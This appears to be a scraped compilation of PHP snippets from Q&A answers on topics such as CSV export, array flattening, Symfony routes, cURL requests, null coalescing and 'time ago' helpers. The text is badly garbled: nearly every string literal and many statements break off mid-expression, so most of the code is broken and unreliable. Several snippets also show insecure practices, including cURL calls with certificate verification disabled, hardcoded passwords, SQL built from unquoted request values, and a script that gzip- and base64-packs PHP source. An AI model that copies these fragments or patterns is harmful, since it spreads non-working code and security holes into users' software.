<? $result = mysql_query("select id from tablename where shid=3"); list($DBshid) = mysql_fetch_row($result); /*********************************** Write date to CSV file ***********************************/ $_file = $_fp = @fopen( $_file, $result = mysql_query("select name,compname,job_title,email_add,phone,url from UserTables where id=3"); while (list( $Username, $Useremail_add, $Userphone, $Userurl) = mysql_fetch_row($result)) { $_csv_data = $Username. @fwrite( $_fp, $_csv_data); } @fclose( $_fp ); ?>
$CSVFileName = “test.csv”; $fp = fopen($CSVFileName, ‘wb’); foreach ($csv_post as $temp) { $line = “”; $line .= “Content 1″ . $comma . “$temp” . $comma . “Content 2″ . $comma . “16/10/2012″.$comma; $line .= “\n”; fputs($fp, $line); }
<?php header("Content-type: application/csv"); header("Content-Disposition: attachment; filename=file.csv"); header("Pragma: no-cache"); header("Expires: 0"); ini_set( $private=1; error_reporting(E_ALL ^ E_NOTICE); mysql_connect("localhost", "user", "pass") or die(mysql_error()); mysql_select_db("db") or die(mysql_error()); $start = mysql_real_escape_string($_GET["start"]); $end = mysql_real_escape_string($_GET["end"]); $query = "SELECT * FROM customers WHERE created>= $select_c = mysql_query($query) or die(mysql_error()); while ($row = mysql_fetch_array($select_c, MYSQL_ASSOC)) { $result.="{$row[ $result.="\n"; echo $result; } ?>
header("Content-type: application/download\r\n"); header("Content-disposition: filename=filename.csv\r\n\r\n"); header("Content-Transfer-Encoding: ASCII\r\n"); header("Content-length: ".strlen($output)."\r\n"); echo $output;
id | word 1 | Sports 2 | Festivals 3 | Classes 4 | Other
function array2string($data){ $log_a = ""; foreach ($data as $key => $value) { if(is_array($value)) $log_a .= "[".$key."] => (". array2string($value). ") \n"; else $log_a .= "[".$key."] => ".$value."\n"; } return $log_a; }
$arr = unserialize(file_get_contents( print_r($arr);
$arr = array( ); $str = preg_replace( $str = file_put_contents(
$data = array("asdcasdc","35353","asdca353sdc","sadcasdc","sadcasdc","asdcsdcsad"); $string_array = json_encode($data);
<?php $sports=$_POST[ $festival=$_POST[ $food=$_POST[ $array=[$sports,$festival,$food]; $string=implode( echo $string; ?>
<?php $arr = array( echo json_encode($arr); {"a":1,"b":2,"c":3,"d":4,"e":5} <?php $b = array ( $results = print_r($b, true); ?>
somePage: pattern: /page/ defaults: { _controller: "AcmeBundle:Test:index" }
$request = $this->container->get( $routeName = $request->get(
class MyController extends Controller { public function myAction($_route) { var_dump($_route); } .....
$router = $this->get("router"); $route = $router->match($this->getRequest()->getPathInfo()); var_dump($route[
$requestStack = $container->get( $masterRequest = $requestStack->getMasterRequest(); if ($masterRequest) { echo $masterRequest->attributes->get( }
public function getCurrentRoute(Request $request) { $pathInfo = $request->getPathInfo(); $routeParams = $this->router->match($pathInfo); $routeName = $routeParams[ if (substr($routeName, 0, 1) === return; } unset($routeParams[ $data = [ ]; return $data; }
<?php $request = $this->container->get( $scheme = $request->getScheme(); $host = $request->getHost(); $route = $request->getPathInfo(); ?>
public function indexAction(Request $request) { $routeName = $request->get( }
class Test { function MethodA(){ echo __FUNCTION__; } }
function a() { $trace = debug_backtrace(); echo $trace[0]["function"]; }
<?php class Test { function MethodA(){ echo __FUNCTION__ ; } } $test = new Test; echo $test->MethodA(); ?>
$a = array(1,2,array(3,4, array(5,6,7), 8), 9); $it = new RecursiveIteratorIterator(new RecursiveArrayIterator($a)); foreach($it as $v) { echo $v, " "; }
function flatten(array $array) { $return = array(); array_walk_recursive($array, function($a) use (&$return) { $return[] = $a; }); return $return; }
$array = your array $result = call_user_func_array( echo "<pre>"; print_r($result);
function array_flatten($array) { $return = array(); foreach ($array as $key => $value) { if (is_array($value)){ $return = array_merge($return, array_flatten($value)); } else { $return[$key] = $value; } } return $return; } $array = Your array $result = array_flatten($array); echo "<pre>"; print_r($result);
function array_flatten(array $array) { $flat = array(); $stack = array_values($array); while($stack) { $value = array_shift($stack); if (is_array($value)) { $stack = array_merge(array_values($value), $stack); } else { $flat[] = $value; } } return $flat; }
foreach(new FlatRecursiveArrayIterator($array) as $key => $value) { echo "** ($key) $value\n"; }
function flatten($array) { if (!is_array($array)) { return array($array); } $result = array(); foreach ($array as $value) { $result = array_merge($result, flatten($value)); } return $result; } $arr = array( echo foreach (flatten($arr) as $value) { echo } echo
<ul><li>foo</li><li>nobody</li><li>expects</li><li>another</li><li>level</li><li>the</li><li>Spanish</li><li>Inquisition</li><li>bar</li><ul>
$concat = function($x) { return array_reduce($x, $compose = function($f, $g) { return function($x) use ($f, $g) { return $f($g($x)); }; }; $identity = function($x) { return $x; }; $flattenA = function($n) use ($compose, $identity, $concat) { return function($x) use ($compose, $identity, $concat, $n) { return ($n === 0)? $x : call_user_func(array_reduce(array_fill(0, $n, $concat), $compose, $identity), $x); }; }; $uncurriedFlip = function($f) { return function($a, $b) use ($f) { return $f($b, $a); }; }; $iterate = function($f) use ($uncurriedFlip) { return function($n) use ($uncurriedFlip, $f) { return function($x) use ($uncurriedFlip, $f, $n) { return ($n === 0)? $x : array_reduce(array_fill(0, $n, $f), $uncurriedFlip( $x); }; }; }; $flattenB = $iterate($concat); $apply = function($f, $x) { return $f($x); }; $curriedFlip = function($f) { return function($a) use ($f) { return function($b) use ($f, $a) { return $f($b, $a); }; }; }; var_dump( array_map( call_user_func($curriedFlip($apply), array(array(array( array( array(array(), array( array($flattenA(2), $flattenB(2))));
function flatten_array(array $array) { return iterator_to_array( new \RecursiveIteratorIterator(new \RecursiveArrayIterator($array))); }
Array ( [name] => Allen Linatoc [age] => 21 [0] => Call of Duty [1] => Titanfall [2] => Far Cry )
$a = [[10, 20], [30, 40]]; $b = [["x" => "X", "y" => "Y"], ["p" => "P", "q" => "Q"]]; print_r(array_merge(...$a)); print_r(array_merge(...$b)); Array ( [0] => 10 [1] => 20 [2] => 30 [3] => 40 ) Array ( [x] => X [y] => Y [p] => P [q] => Q )
$c = ["a" => ["x" => "X", "y" => "Y"], "b" => ["p" => "P", "q" => "Q"]]; print_r(array_merge(...array_values($c))); Array ( [x] => X [y] => Y [p] => P [q] => Q )
$arr = [1, 2, [3, 4]]; $arr = array_reduce($arr, function ($a, $b) { return array_merge($a, (array) $b); }, []);
function flatten($array) { $return = array(); while(count($array)) { $value = array_shift($array); if(is_array($value)) foreach($value as $sub) $array[] = $sub; else $return[] = $value; } return $return; }
<?php function flatten($array) { return array_reduce($array, function($acc, $item){ return array_merge($acc, is_array($item) ? flatten($item) : [$item]); }, []); } $array = [1, 2, [3, 4], [5, [6, 7]], 8, 9, 10]; print_r(flatten($array));
function _flatten_array($arr) { while ($arr) { list($key, $value) = each($arr); is_array($value) ? $arr = $value : $out[$key] = $value; unset($arr[$key]); } return (array)$out; }
array ( array ( array ( 0 => array ( array ( array ( 0 => array ( ), ), ), ), ), ), )
function flatten_array(&$arr, &$dst) { if(!isset($dst) || !is_array($dst)) { $dst = array(); } if(!is_array($arr)) { $dst[] = $arr; } else { foreach($arr as &$subject) { flatten_array($subject, $dst); } } } $recursive = array( echo "Recursive: \r\n"; print_r($recursive); $flat = null; flatten_array($recursive, $flat); echo "Flat: \r\n"; print_r($flat); echo "String:\r\n"; echo implode(
/** * For merging values of a multidimensional array into one * * $array = [ * 0 => [ * 0 => * 1 => * 2 => * 3 => * ], * 1 => [ * 0 => * 1 => * 2 => * ] * ]; * * becomes : * * $array = [ * 0 => * 1 => * 2 => * 3 => * 4 => * 5 => * 6 => * * ] */ array_reduce ( $multiArray , function ($lastItem, $currentItem) { $lastItem = $lastItem ?: array(); return array_merge($lastItem, array_values($currentItem)); } );
$a = array(1,2,array(3,4, array(5,6,7), 8), 9); $o = []; for ($i=0; $i<count($a); $i++) { if (is_array($a[$i])) { array_splice($a, $i+1, 0, $a[$i]); } else { $o[] = $a[$i]; } }
function flatten(array $array) { $result = array(); if (is_array($array)) { foreach ($array as $k => $v) { if (is_array($v)) { $result = array_merge($result, flatten($v)); } else { $result[] = $v; } } } return $result; }
/** * @param array|object $array array of mixed values to flatten * @param int|boolean $level 0:deep, 1:shallow, 2:2 levels, 3... * @return array */ function flatten($array, $level = 0) { $level = (int) $level; $result = array(); foreach ($array as $i => $v) { if (0 <= $level && is_array($v)) { $v = flatten($v, $level > 1 ? $level - 1 : 0 - $level); $result = array_merge($result, $v); } elseif (is_int($i)) { $result[] = $v; } else { $result[$i] = $v; } } return $result; }
/** * Flattens a multi demensional array into a one dimensional * to be compatible with hidden html fields. * * @param array $array * Array in the form: * array( * * * ) * ) * * @return array * Array in the form: * array( * * ) */ function flatten_array($array) { $continue = TRUE; while ($continue) { $continue = FALSE; foreach ($array as $key => $value) { if (is_array($value)) { $continue = TRUE; foreach ($value as $child_key => $child_value) { $array[$key . } unset($array[$key]); } } } return $array; }
function arrayFlatten($array_in, &$array_out){ if(is_array($array_in)){ foreach ($array_in as $element){ arrayFlatten($element, $array_out); } } else{ $array_out[] = $array_in; } } $arr1 = array( arrayFlatten($arr1, $arr2); echo "<pre>"; print_r($arr2); echo "</pre>";
<?php $nested_array = [[1,2,[3]],4,[5],[[[6,[7=>[7,8,9,10]]]]]]; $index_count = 1; $flatered_array = array(); $flatered_array = flat_array($nested_array, $index_count); echo "<pre>"; print_r($flatered_array); function flat_array($nested_array, & $index_count, & $flatered_array) { foreach($nested_array AS $key=>$val) { if(is_array($val)) { flat_array($val, $index_count, $flatered_array); } else { $flatered_array[$index_count] = $val; ++$index_count; } } return $flatered_array; } ?>
$My_Array = array(1,2,array(3,4, array(5,6,7), 8), 9); function checkArray($value) { foreach ($value as $var) { if ( is_array($var) ) { checkArray($var); } else { echo $var; } } } checkArray($My_Array);
$test_array = array( array( array(0, 0, array(0, 0, 0, 0), array(0, 0, 0, 0) ); $it = new RecursiveIteratorIterator(new RecursiveArrayIterator($test_array)); var_dump( iterator_to_array($it, false) ) ;
$test = [ ] ], ] ]; $flatten = function ($input, $parent = []) use (&$flatten) { $return = []; foreach ($input as $k => $v) { if (is_array($v)) { $return = array_merge($return, $flatten($v, array_merge($parent, [$k]))); } else { if ($parent) { $key = implode( if (substr_count($key, $key = preg_replace( } } else { $key = $k; } $return[$key] = $v; } } return $return; }; die(var_dump( $flatten($test) )); array(4) { ["a[b][c][0]"]=> string(1) "a" ["a[b][c][1]"]=> string(1) "b" ["b"]=> string(1) "c" ["c[d]"]=> string(1) "e" }
function objectArray_flatten($array,$childField) { $result = array(); foreach ($array as $node) { $result[] = $node; if(isset($node->$childField)) { $result = array_merge( $result, objectArray_flatten($node->$childField,$childField) ); unset($node->$childField); } } return $result; }
ini_set("log_errors", 1); ini_set("error_log", "/tmp/php-error.log"); error_log( "Hello, errors!" );
error_log("You messed up!", 3, "/var/tmp/my-errors.log");
error_reporting(E_ALL); ini_set( ini_set( ini_set( ini_set(
<IfModule mod_php5.c> php_flag log_errors on php_value error_log ./path_to_MY_PHP_ERRORS.log </IfModule>
/* [2017-03-20 3:35:43] [INFO] [file.php] Here we are [2017-03-20 3:35:43] [ERROR] [file.php] Not good [2017-03-20 3:35:43] [DEBUG] [file.php] Regex empty mylog ( mylog ( mylog ( mylog ( */ function mylog($text, $level= switch (strtolower($level)) { case case $level= break; case case $level= break; case case $level= break; default: $level= } error_log(date("[Y-m-d H:i:s]")."\t[".$level."]\t[".basename(__FILE__)."]\t".$text."\n", 3, $file); }
function phpwtf(string $s) { echo "$s\n"; } phpwtf("Type hinting is da bomb");
function foo($string) { if (!is_string($string)) { trigger_error( return; } ... }
<?php function test(boolean $param) {} test(true); ?>
Fatal error: Uncaught TypeError: Argument 1 passed to test() must be an instance of boolean, boolean given, called in - on line 1 and defined in -:1
class string { } class int { } class float { } class double { }
class string { } $n = 1234; $s1 = (string)$n; $s2 = new string(); $a = array( printf("\$s1 - primitive string? %s - string instance? %s\n", $a[is_string($s1)], $a[is_a($s1, printf("\$s2 - primitive string? %s - string instance? %s\n", $a[is_string($s2)], $a[is_a($s2,
<?php function phpwtf($s) { $s = (string) $s; echo "$s\n"; } phpwtf("Type hinting is da bomb");
class string { private $Text; public function __construct($value) { $this->Text = $value; } public function __toString() { return $this->Text; } } function Test123(string $s) { echo $s; } Test123(new string("Testing"));
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
function base64_url_encode($input) { return strtr(base64_encode($input), } function base64_url_decode($input) { return base64_decode(strtr($input, }
$str = $encoded = urlencode( base64_encode( $str ) ); $decoded = base64_decode( urldecode( $encoded ) );
function base64url_encode($data) { return rtrim(strtr(base64_encode($data), } function base64url_decode($data) { return base64_decode(str_pad(strtr($data, }
<?php $a = null; print $a ?? print "\n"; print $a ?: print "\n"; print $c ?? print "\n"; print $c ?: print "\n"; $b = array( print $b[ print "\n"; print $b[ print "\n"; print $b[ print "\n"; print $b[ print "\n";
b b a Notice: Undefined variable: c in /in/apAIb on line 14 a d d e Notice: Undefined index: c in /in/apAIb on line 33 e
$x= $value=($x)?: var_dump($value); if($x){ $value=$x; } else{ $value= } var_dump($value);
$value=($x)?? var_dump($value); if(isset($x)){ $value=$x; } else{ $value= } var_dump($value);
var_dump (false ?? var_dump (true ?? var_dump (null ?? var_dump ( var_dump (0 ?? var_dump (false ?: var_dump (true ?: var_dump (null ?: var_dump ( var_dump (0 ?:
echo 0 ?: 1 ?: 2 ?: 3; echo 1 ?: 0 ?: 3 ?: 2; echo 2 ?: 1 ?: 0 ?: 3; echo 3 ?: 2 ?: 1 ?: 0; echo 0 ?: 1 ?: 2 ?: 3; echo 0 ?: 0 ?: 2 ?: 3; echo 0 ?: 0 ?: 0 ?: 3;
if( truthy ) {} else if(truthy ) {} else if(truthy ) {} .. else {}
if(!isset($x) || is_null($x) ) {} else if(!isset($y) || is_null($y) ) {} else {}
if(!isset($_GET[ if(isset($user_name) && !empty($user_name)){ $name = $user_name; }else { $name = } } else { $name = $_GET[ }
$a = NULL; $c = print $a ?? print "\n"; print $a ?: print "\n"; print $c ?? print "\n"; print $c ?: print "\n"; print $e ?? print "\n"; print $e ?:
1b 2b 2d 1f Notice: Undefined variable: e in /in/ZBAa1 on line 21 2f
<?php /** Fetches the value of $_GET[ $username = $_GET[ /** This is equivalent to: **/ $username = isset($_GET[ /** Coalescing can be chained: this will return the first defined value out of $_GET[ $username = $_GET[ ?>
$false = null; $var = $false ?? "true"; echo $var . "---<br>"; $false = false; $var = $false ?? "true"; echo $var . "---<br>";
$false = null; $var = (isset($false) or !$false) ? $false : "true"; echo $var . "---<br>"; $false = false; $var = (isset($false) or !$false) ? $false : "true"; echo $var . "---<br>"; $false = ""; $var = (isset($false) or !$false) ? $false : "true"; echo $var . "---<br>"; $false = true; $var = (isset($false) or !$false) ? $false : "true"; echo $var . "---<br>";
class a { public $a = } $a = new a(); echo $a->a; echo $a->b; echo $a->a ?? echo $a->b ?? echo $a->b->c ??
<?php $greeting = echo $greeting ?? $greeting = null; echo $greeting ?? unset($greeting); echo $greeting ??
<?php echo "Welcome ", (isset($_POST[ echo "Welcome ", ($_POST[
el@apollo:/home/el$ curl http: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 492k 100 492k 0 0 1077k 0 --:--:-- --:--:-- --:--:-- 1240k
php> $ch = curl_init(); php> curl_setopt($ch, CURLOPT_URL, php> curl_exec($ch);
php> $ch = curl_init(); php> curl_setopt($ch, CURLOPT_URL, php> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); php> $contents = curl_exec($ch); php> echo $contents;
<?php $curl_handle=curl_init(); curl_setopt($curl_handle,CURLOPT_URL, curl_setopt($curl_handle,CURLOPT_CONNECTTIMEOUT,2); curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1); $buffer = curl_exec($curl_handle); curl_close($curl_handle); if (empty($buffer)){ print "Nothing returned from url.<p>"; } else{ print $buffer; } ?>
<?php $cSession = curl_init(); curl_setopt($cSession,CURLOPT_URL,"http: curl_setopt($cSession,CURLOPT_RETURNTRANSFER,true); curl_setopt($cSession,CURLOPT_HEADER, false); $result=curl_exec($cSession); curl_close($cSession); echo $result; ?>
public function curlCall($apiurl, $auth, $rflag) { $ch = curl_init($apiurl); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if($auth == curl_setopt($ch, CURLOPT_USERPWD, "passw:passw"); } else { curl_setopt($ch, CURLOPT_USERPWD, "ss:ss1"); } curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $dt = curl_exec($ch); curl_close($ch); if($rflag != 1) { $dt = json_decode($dt,true); } return $dt; }
<?php $some_data = array( ); $curl = curl_init(); curl_setopt($curl, CURLOPT_POST, 1); curl_setopt($curl, CURLOPT_URL, curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_POSTFIELDS, $some_data); $result = curl_exec($curl); $info = curl_getinfo($curl); echo echo curl_close($curl); echo $result; ?>
error_reporting(E_ALL); ini_set("display_errors", 1); $url = $data = array("message" => "Hello World!!!"); try { $ch = curl_init($url); $data_string = json_encode($data); if (FALSE === $ch) throw new Exception( curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string); curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HTTPHEADER, array( curl_setopt($ch, CURLOPT_TIMEOUT, 5); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); $output = curl_exec($ch); if (FALSE === $output) throw new Exception(curl_error($ch), curl_errno($ch)); } catch(Exception $e) { trigger_error(sprintf( $e->getCode(), $e->getMessage()), E_USER_ERROR); }
<?php class Curl { public $error; function __construct() {} function Get($url = "http: $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 60); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); if($session){ curl_setopt($ch, CURLOPT_COOKIESESSION, true ); curl_setopt($ch , CURLOPT_COOKIEJAR, curl_setopt($ch , CURLOPT_COOKIEFILE, } if($forceSsl){ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); } if(!empty($cookie)){ curl_setopt($ch, CURLOPT_COOKIE, $cookie); } $info = curl_getinfo($ch); $res = curl_exec($ch); if (curl_error($ch)) { $this->error = curl_error($ch); throw new Exception($this->error); }else{ curl_close($ch); return $res; } } function GetArray($url = "http: $url = $url . "?". http_build_query($data); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 60); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); if($session){ curl_setopt($ch, CURLOPT_COOKIESESSION, true ); curl_setopt($ch , CURLOPT_COOKIEJAR, curl_setopt($ch , CURLOPT_COOKIEFILE, } if($forceSsl){ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); } if(!empty($cookie)){ curl_setopt($ch, CURLOPT_COOKIE, $cookie); } $info = curl_getinfo($ch); $res = curl_exec($ch); if (curl_error($ch)) { $this->error = curl_error($ch); throw new Exception($this->error); }else{ curl_close($ch); return $res; } } function PostJson($url = "http: $data = json_encode($data); $ch = curl_init($url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 60); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); if($session){ curl_setopt($ch, CURLOPT_COOKIESESSION, true ); curl_setopt($ch , CURLOPT_COOKIEJAR, curl_setopt($ch , CURLOPT_COOKIEFILE, } if($forceSsl){ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); } if(!empty($cookie)){ curl_setopt($ch, CURLOPT_COOKIE, $cookie); } curl_setopt($ch, CURLOPT_HTTPHEADER, array( ); $res = curl_exec($ch); if (curl_error($ch)) { $this->error = curl_error($ch); throw new Exception($this->error); }else{ curl_close($ch); return $res; } } function Post($url = "http: foreach ($files as $k => $v) { $f = realpath($v); if(file_exists($f)){ $fc = new CurlFile($f, mime_content_type($f), basename($f)); $data["file[".$k."]"] = $fc; } } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_SAFE_UPLOAD, false); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)"); curl_setopt($ch, CURLOPT_TIMEOUT, 60); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); if($session){ curl_setopt($ch, CURLOPT_COOKIESESSION, true ); curl_setopt($ch , CURLOPT_COOKIEJAR, curl_setopt($ch , CURLOPT_COOKIEFILE, } if($forceSsl){ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); } if(!empty($cookie)){ curl_setopt($ch, CURLOPT_COOKIE, $cookie); } $res = curl_exec($ch); if (curl_error($ch)) { $this->error = curl_error($ch); throw new Exception($this->error); }else{ curl_close($ch); return $res; } } } ?>
<?php $urlget = "http: $url = "http: $data = array("name" => "Max", "age" => "36"); $files = array( $curl = new Curl(); echo $curl->Get($urlget, true, "token=12345"); echo $curl->GetArray($url, $data, true); echo $curl->Post($url, $data, $files, true); echo $curl->PostJson($url, $data, true); ?>
<?php /* $Cookie = session_get_cookie_params(); print_r($Cookie); */ session_set_cookie_params(9000, session_start(); $_SESSION[ echo "Session count: " . $_SESSION[ echo $json = file_get_contents( $arr = json_decode($json, true); echo "<pre>"; if(!empty($json)){ print_r($arr); } if(!empty($_GET)){ print_r($_GET); } if(!empty($_POST)){ print_r($_POST); } if(!empty($_FILES)){ print_r($_FILES); } print_r(getallheaders()); print_r(apache_response_headers()); ?>
<?php function detectRequestBody() { $rawInput = fopen( $tempStream = fopen( stream_copy_to_stream($rawInput, $tempStream); rewind($tempStream); return $tempStream; }
$request = new http\Env\Request(); $request->getBody();
$sapi_type = php_sapi_name(); if (substr($sapi_type, 0, 3) == header("Status: 404 Not Found"); else header("HTTP/1.1 404 Not Found");
if (!function_exists( { function http_response_code($newcode = NULL) { static $code = 200; if($newcode !== NULL) { header( if(!headers_sent()) $code = $newcode; } return $code; } }
$httpStatusCode = 521; $httpStatusMsg = $phpSapiName = substr(php_sapi_name(), 0, 3); if ($phpSapiName == header( } else { $protocol = isset($_SERVER[ header($protocol. }
<?php var_dump(http_response_code(404)); var_dump(http_response_code()); ?>
define( require( header("HTTP/1.1 200 OK"); header("Status: 200 All rosy");
header("HTTP/1.1 200 OK"); http_response_code(201);
<?php $infile=$_SERVER[ $outfile=$_SERVER[ if (!$infile || !$outfile) { die("Usage: php {$_SERVER[ } echo "Processing $infile to $outfile\n"; $data="ob_end_clean();?>"; $data.=php_strip_whitespace($infile); $data=gzcompress($data,9); $data=base64_encode($data); $out= file_put_contents($outfile,$out);
$count = 5; print "This is " . $count . " values in " . $count/5 . " parameter";
echo foo() and print("ok.\n") or print("error: " . getError() . ".\n");
curl_setopt ($ch, CURLOPT_CAINFO, "PATH_TO/cacert.pem");
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, TRUE); curl_setopt ($ch, CURLOPT_CAINFO, "pathto/cacert.pem");
C:\wamp\bin\apache\Apachex.x.x\bin C:\wamp\bin\php\phpx.x.xx
curl_setopt ($ch, CURLOPT_CAINFO, "pathto/{downloaded certificate chain file}");
openssl s_client -host www.googleapis.com -port 443
Certificate chain 0 s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=*.googleapis.com i:/C=US/O=Google Inc/CN=Google Internet Authority G2 1 s:/C=US/O=Google Inc/CN=Google Internet Authority G2 i:/C=US/O=GeoTrust Inc./CN=GeoTrust Global CA 2 s:/C=US/O=GeoTrust Inc./CN=GeoTrust Global CA i:/C=US/O=Equifax/OU=Equifax Secure Certificate Authority
openssl.cafile /usr/local/php5/ssl/certs/cacert.pem
function _ago($tm,$rcs = 0) { $cur_tm = time(); $dif = $cur_tm-$tm; $pds = array( $lngh = array(1,60,3600,86400,604800,2630880,31570560,315705600); for($v = sizeof($lngh)-1; ($v >= 0)&&(($no = $dif/$lngh[$v])<=1); $v--); if($v < 0) $v = 0; $_tm = $cur_tm-($dif%$lngh[$v]); $no = floor($no); if($no <> 1) $pds[$v] .= $x = sprintf("%d %s ",$no,$pds[$v]); if(($rcs == 1)&&($v >= 1)&&(($cur_tm-$_tm) > 0)) $x .= time_ago($_tm); return $x; }
echo time_elapsed_string( echo time_elapsed_string( echo time_elapsed_string(
function time_elapsed_string($datetime, $full = false) { $now = new DateTime; $ago = new DateTime($datetime); $diff = $now->diff($ago); $diff->w = floor($diff->d / 7); $diff->d -= $diff->w * 7; $string = array( ); foreach ($string as $k => &$v) { if ($diff->$k) { $v = $diff->$k . } else { unset($string[$k]); } } if (!$full) $string = array_slice($string, 0, 1); return $string ? implode( }
function time_elapsed_string($ptime) { $etime = time() - $ptime; if ($etime < 1) { return } $a = array( 365 * 24 * 60 * 60 => 30 * 24 * 60 * 60 => 24 * 60 * 60 => 60 * 60 => 60 => 1 => ); $a_plural = array( ); foreach ($a as $secs => $str) { $d = $etime / $secs; if ($d >= 1) { $r = round($d); return $r . } } }
$time_elapsed = timeAgo($time_ago); function timeAgo($time_ago) { $time_ago = strtotime($time_ago); $cur_time = time(); $time_elapsed = $cur_time - $time_ago; $seconds = $time_elapsed ; $minutes = round($time_elapsed / 60 ); $hours = round($time_elapsed / 3600); $days = round($time_elapsed / 86400 ); $weeks = round($time_elapsed / 604800); $months = round($time_elapsed / 2600640 ); $years = round($time_elapsed / 31207680 ); if($seconds <= 60){ return "just now"; } else if($minutes <=60){ if($minutes==1){ return "one minute ago"; } else{ return "$minutes minutes ago"; } } else if($hours <=24){ if($hours==1){ return "an hour ago"; }else{ return "$hours hrs ago"; } } else if($days <= 7){ if($days==1){ return "yesterday"; }else{ return "$days days ago"; } } else if($weeks <= 4.3){ if($weeks==1){ return "a week ago"; }else{ return "$weeks weeks ago"; } } else if($months <=12){ if($months==1){ return "a month ago"; }else{ return "$months months ago"; } } else{ if($years==1){ return "one year ago"; }else{ return "$years years ago"; } } }
function humanTiming ($time) { $time = time() - $time; $time = ($time<1)? 1 : $time; $tokens = array ( 31536000 => 2592000 => 604800 => 86400 => 3600 => 60 => 1 => ); foreach ($tokens as $unit => $text) { if ($time < $unit) continue; $numberOfUnits = floor($time / $unit); return $numberOfUnits. } } echo humanTiming( strtotime($mytimestring) );
function since($timestamp, $level=6) { global $lang; $date = new DateTime(); $date->setTimestamp($timestamp); $date = $date->diff(new DateTime()); $since = json_decode($date->format( $since = array_filter($since); $since = array_slice($since, 0, $level); $last_key = key(array_slice($since, -1, 1, true)); $string = foreach ($since as $key => $val) { if ($string) { $string .= $key != $last_key ? } $key .= $val > 1 ? $string .= $val . } return $string; }
function time_ago ($tm, $rcs = 0) { $cur_tm = time(); $dif = $cur_tm - $tm; $pds = array( $lngh = array(1,60,3600,86400,604800,2630880,31570560,315705600); for ($v = count($lngh) - 1; ($v >= 0) && (($no = $dif / $lngh[$v]) <= 1); $v--); if ($v < 0) $v = 0; $_tm = $cur_tm - ($dif % $lngh[$v]); $no = ($rcs ? floor($no) : round($no)); if ($no != 1) $pds[$v] .= $x = $no . if (($rcs > 0) && ($v >= 1)) $x .= return $x; }
/* * Returns a string stating how long ago this happened */ private function timeElapsedString($ptime){ $diff = time() - $ptime; $calc_times = array(); $timeleft = array(); $calc_times[] = array( $calc_times[] = array( $calc_times[] = array( $calc_times[] = array( $calc_times[] = array( $calc_times[] = array( foreach ($calc_times AS $timedata){ list($time_sing, $time_plur, $offset) = $timedata; if ($diff >= $offset){ $left = floor($diff / $offset); $diff -= ($left * $offset); $timeleft[] = "{$left} " . ($left == 1 ? $time_sing : $time_plur); } } return $timeleft ? (time() > $ptime ? null : }
function timeAgo($time_ago) { $time_ago = strtotime($time_ago) ? strtotime($time_ago) : $time_ago; $time = time() - $time_ago; switch($time): case $time <= 60; return case $time >= 60 && $time < 3600; return (round($time/60) == 1) ? case $time >= 3600 && $time < 86400; return (round($time/3600) == 1) ? case $time >= 86400 && $time < 604800; return (round($time/86400) == 1) ? case $time >= 604800 && $time < 2600640; return (round($time/604800) == 1) ? case $time >= 2600640 && $time < 31207680; return (round($time/2600640) == 1) ? case $time >= 31207680; return (round($time/31207680) == 1) ? endswitch; } ?>
